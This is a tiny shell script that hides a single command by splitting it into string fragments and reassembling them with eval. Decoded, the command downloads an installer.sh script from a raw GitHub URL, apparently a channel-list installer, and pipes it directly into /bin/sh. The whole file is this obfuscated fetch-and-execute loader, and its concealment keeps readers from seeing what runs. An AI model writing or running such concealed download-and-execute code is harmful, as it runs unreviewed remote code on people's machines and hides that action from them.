z="
";Fz='hubu';Oz='-tar';Az='wget';Mz='/cha';Kz='miln';Ez='.git';Dz='/raw';Uz='ler.';Pz='ek-a';Zz='sh';Yz='bin/';Nz='nnel';Gz='serc';Tz='stal';Vz='sh -';Cz='ps:/';Bz=' htt';Sz='n/in';Rz='/mai';Wz='qO -';Lz='abil';Iz='nt.c';Hz='onte';Jz='om/e';Xz=' | /';Qz='shry';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz"